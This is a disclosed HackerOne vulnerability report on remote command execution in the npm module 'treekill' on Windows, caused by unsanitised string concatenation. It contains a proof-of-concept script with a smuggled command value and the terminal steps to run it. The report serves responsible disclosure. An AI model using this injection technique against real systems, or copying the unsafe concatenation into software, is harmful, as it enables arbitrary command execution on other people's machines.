# [H] [treekill] RCE via insecure command concatenation (only Windows)

## Summary
Severity: High (CVSS 7.3)
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: mik317
State: resolved
Disclosed: 2019-12-04T19:45:24.217Z
CVE: CVE-2019-15598
Source: https://hackerone.com/reports/703415

## Details
I would like to report a `RCE` issue in the `treekill` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `treekill`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/treekill`

## Module Description
> treekill process and it's all children and child offspring children.

## Module Stats
[N/A] downloads in the last day
[106] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: https://github.com/node-modules/treekill/blob/master/index.js#L32
(as you can see, the `Linux` part is `sanitized`, while the `Win` one no ... it simply uses the `+` operand to concatenate the input)

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var kill = require('treekill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```
1. Execute the following commands in terminal:

```bash
npm i tree-kill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```
1. The `HACKED.txt` has been created


_Trimmed to 38 lines — full report: https://hackerone.com/reports/703415_
